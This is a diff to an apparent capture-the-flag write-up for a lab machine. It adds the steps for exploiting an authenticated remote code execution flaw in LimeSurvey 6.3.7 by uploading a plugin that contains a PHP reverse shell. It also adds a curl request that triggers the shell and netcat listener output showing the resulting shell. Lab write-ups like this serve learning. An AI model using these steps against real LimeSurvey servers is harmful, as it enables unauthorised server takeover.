@@ -82,17 +82,34 @@ Once the LimeSurvey installation is finished, we can access the admin interface 
 
 Upon logging in, the admin interface indicates LimeSurvey **6.3.7+231127** is running. Public advisories report that this version is susceptible to an **authenticated remote code execution (RCE)** vulnerability.
 The steps are quite simple:
-  Create archive with these files
-  Login with credentials
-  Go Configuration -> Plugins -> Upload & Install
-  Choose your zipped file
-  Upload
-  Install
-  Activate plugin
-  Start your listener
-  Go url+{upload/plugins/#Name/#Shell_file_name}
-  Get reverse shell.
+1. Create archive with these files
+2. Login with credentials
+3. Go Configuration -> Plugins -> Upload & Install
+4. Choose your zipped file
+5. Upload & Install
+6. Pivoting.
+7. Start your listener
+8. Go url+{upload/plugins/#Name/#Shell_file_name}
 
+Editing the config.xml file to include the 6.0 version and the php-rev.php to connect to our attacker machine, we are able to zip it and send it to the webserver.
 
+![Installed](installed.png)
 
+Once the file was uploaded, we accessed the resource at the GitHub‑specified path — either via a browser or by sending an HTTP request from the terminal (curl) — to trigger and observe its behavior.
+
+```
+curl http://10.129.234.81/survey/upload/plugins/Y1LD1R1M/php-rev.php
+```
+With the netcat listener on the background, we get a response from the webserver.
+
+```
+➜  Forgotten nc -lnvp 4444                                                                  
+listening on [any] 4444 ...   
+connect to [0.0.0.0] from (UNKNOWN) [10.129.234.81] 41372                                
+Linux efaa6f5097ed 6.8.0-1033-aws #35~22.04.1-Ubuntu SMP Wed Jul 23 17:51:00 UTC 2025 x86_64 GNU/Linux                                                                                  
+ 12:24:58 up 11:21,  0 users,  load average: 0.03, 0.07, 0.02                               
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                     
+uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)                           
+/bin/sh: 0: can't access tty; job control turned off 
+```
 
